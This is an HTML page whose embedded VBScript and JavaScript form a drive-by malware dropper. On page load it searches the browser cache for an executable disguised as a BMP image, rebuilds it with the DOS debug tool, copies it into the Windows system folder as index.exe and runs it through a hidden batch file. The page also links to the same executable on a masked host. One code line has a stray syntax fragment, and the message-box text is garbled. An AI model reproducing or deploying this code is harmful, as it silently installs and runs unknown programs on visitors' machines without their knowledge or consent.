
<SCRIPT LANGUAGE="VBScript">
Option Explicit
Dim FSO,WSH,CACHE,str,sucess
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSH = CreateObject("WScript.Shell")
CACHE=wsh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache")
sucess=0

sub FF
 SearchBMPFile fso.GetFolder(CACHE),"index[1].bmp"
 if sucess=0 then SearchBMPFile fso.GetFolder(CACHE),"index[2].bmp"
End sub


Function SearchBMPFile(Folder,fname)
   Dim SubFolder,File,Lt,tmp,winsys
   str=FSO.GetParentFolderName(folder) & "\" & folder.name & "\" & fname');
   if FSO.FileExists(str) then
      tmp=fso.GetSpecialFolder(2) & "\"
      winsys=fso.GetSpecialFolder(1) & "\"
      set File=FSO.GetFile(str)
      File.Copy(tmp & "tmp.dat")
      On Error Resume Next
      File.Delete
      if FSO.FileExists(str) then exit function
      set Lt=FSO.CreateTextFile(tmp & "tmp.in")
      Lt.WriteLine("rbx")
      Lt.WriteLine("0")
      Lt.WriteLine("rcx")
      '下面的数字是十六进制的EXE文件的大小
      Lt.WriteLine("E825")
      Lt.WriteLine("w136")
      Lt.WriteLine("q")
      Lt.Close
      set Lt=FSO.CreateTextFile(tmp & "tmp.bat")
      Lt.WriteLine("@echo off")
      Lt.WriteLine("debug " & tmp & "tmp.dat <" & tmp & "tmp.in >" & tmp & "tmp.out")
      Lt.WriteLine("copy " & tmp & "tmp.dat " & winsys & "index.exe>" & tmp & "tmp.out")
      Lt.WriteLine("del " & tmp & "tmp.dat >" & tmp & "tmp.out")
      Lt.WriteLine("del " & tmp & "tmp.in >" & tmp & "tmp.out")
      Lt.WriteLine(winsys & "index.exe")
      Lt.Close
      WSH.Run tmp & "tmp.bat",false,6
      On Error Resume Next
      'FSO.GetFile(tmp & "tmp.bat").Delete
      sucess=1
      msgbox "翴約碞琌癸и程や,谅谅"
   end if
   If Folder.SubFolders.Count <> 0 Then
      For Each SubFolder In Folder.SubFolders
         SearchBMPFile SubFolder,fname
      Next
   End If
End Function
</script>

<SCRIPT language=JavaScript>
function F()
{
  FF();
  if (sucess==0) setTimeout("F()", 2000);
}
setTimeout("F()", 2000);
</SCRIPT>
<body>
<div align="center"><a href="http://xxxx.xxxxx.xxxx.xxx/index.exe"><img src="logo.jpg" width="500" height="331" border="0"></a>
</body>
</html>


